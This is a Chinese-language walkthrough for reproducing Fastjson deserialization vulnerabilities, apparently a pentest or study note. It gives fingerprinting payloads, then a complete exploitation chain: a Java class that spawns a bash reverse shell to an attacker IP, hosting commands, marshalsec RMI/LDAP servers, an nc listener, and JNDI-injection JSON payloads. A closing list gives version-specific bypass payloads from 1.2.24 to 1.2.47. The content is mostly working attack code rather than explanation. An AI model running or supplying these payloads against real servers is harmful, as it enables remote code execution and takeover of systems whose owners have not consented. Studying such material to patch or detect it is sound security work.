# fastjson复现

### fastjson指纹特征

1. 根据返回包判断

抓包，change request method为POST，post一个数据`{`，返回包在就会出现**fastjson**字样。当然这个错误可以屏蔽，如果屏蔽使用其它办法。

2. 利用dnslog盲打

http://www.dnslog.cn/

构造payload，利用dnslog平台接收

```java
{"zeo":{"@type":"java.net.Inet4Address","val":"dnslog"}}
```

1.2.67版本后payload

```java
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
畸形：
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
```

### 漏洞利用

- 保存为Exploit.java，编译生成Exploit.class

{ip}   = 攻击者的ip
{port} = 攻击者nc接收的端口

```java
import java.io.*;

import java.util.*;

public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","/bin/bash -i >& /dev/tcp/192.168.120.68/1234 0>&1"});
        }catch (Exception e){}
    }
}
```

- 起一个http服务，确保能访问到Exploit.class

```python
//192.168.120.134:8080
python -m SimpleHTTPServer 8080
```

- marshalsec起RMI或LDAP服务

输入如下命令，启动一个RMI或LDAP服务器，监听9999端口

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.120.134:8080/#Exploit" 9999

or

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.120.134:8080/#Exploit" 9999
```

- nc监听端口

```bash
nc -lvvp 1234
```

- burp发包

请求方式改为POST，Content-Type: application/json

请求内容如下

ip为起rmi 服务的ip

端口为起rmi 服务的端口

```
1.2.24
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.120.134:9999/Exploit", "autoCommit":true}}
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.120.134:9999/Exploit", "autoCommit":true}}


1.2.47
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.120.134:9999/Exploit",
        "autoCommit":true
    }
}
```

- 成功反弹

### 一些POC

```java
1.2.24
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}}

未知版本(1.2.24-41之间)
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

1.2.41
{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

1.2.42
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true};

1.2.43
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true]}

1.2.45
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099/Exploit"}}

1.2.47
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}}}
```

